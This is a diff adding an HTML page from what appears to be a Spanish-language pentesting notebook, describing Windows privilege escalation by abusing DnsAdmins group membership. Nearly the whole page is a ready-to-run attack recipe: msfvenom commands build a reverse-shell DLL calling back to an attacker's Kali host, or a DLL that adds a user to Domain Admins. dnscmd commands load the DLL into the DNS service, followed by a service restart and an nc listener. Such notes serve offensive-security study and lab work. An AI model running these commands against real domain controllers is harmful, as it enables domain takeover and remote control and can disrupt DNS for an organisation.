@@ -1,0 +1,94 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>DNS Admins | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="dns-admins">
+          <div class="note-tabbar">
+            <span>DNS Admins</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Escalada de Privilegios/Windows/Grupos</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">escalada de privilegios / windows / grupos</p>
+            <h2>DNS Admins</h2>
+
+            <aside class="callout warning">
+              <p><strong>DNS Admins</strong> 1. Crear un Payload 2. Apuntar la configuración  del servicio DNS al payload 3. Reiniciar servicio para cargar el paylaod</p>
+            </aside>
+
+            <aside class="callout warning">
+              <p>DnsAdmins puede permitir cargar una DLL en el servicio DNS si se tienen permisos y el servicio corre en un DC. Es una técnica de alto impacto y puede interrumpir resolución DNS.</p>
+            </aside>
+
+            <section class="code-card">
+              <h3>Kali: Payload</h3>
+              <pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;kali_ip&gt; LPORT=443 -f dll -o rev.dll
+
+msfvenom -p windows/x64/exec cmd='net group &quot;domain admins&quot; &lt;user&gt; /add /domain' -f dll -o adduser.dll # Alternativa</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>CMD: Subimos al DNS el Payload</h3>
+              <pre><code>dnscmd.exe /config /serverlevelplugindll C:\Users\&lt;user&gt;\Desktop\rev.dll
+
+dnscmd /config /serverlevelplugindll C:\Users\&lt;user&gt;\Desktop\adduser.dll # Alternativa
+
+# Comprobar subida
+reg query HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>CMD: Reiniciar el servicio DNS o Esperar que se reinicie solo</h3>
+              <pre><code># Posible que no tengamos permisos para reiniciar este servicio
+sc.exe stop dns
+sc.exe start dns</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>CMD: Comprobar que pertenecemos al grupo de ADMINS o que hemos recibido la reverse shell</h3>
+              <pre><code>net group &quot;Domain Admins&quot; /dom
+# Kali: Listener
+rlwrap nc -nlvp 443</code></pre>
+            </section>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>notebook</span>
+              <span>windows</span>
+              <span>privesc</span>
+              <span>escalada_privilegios</span>
+              <span>grupos</span>
+              <span>active_directory</span>
+              <span>dns</span>
+              <span>admins</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
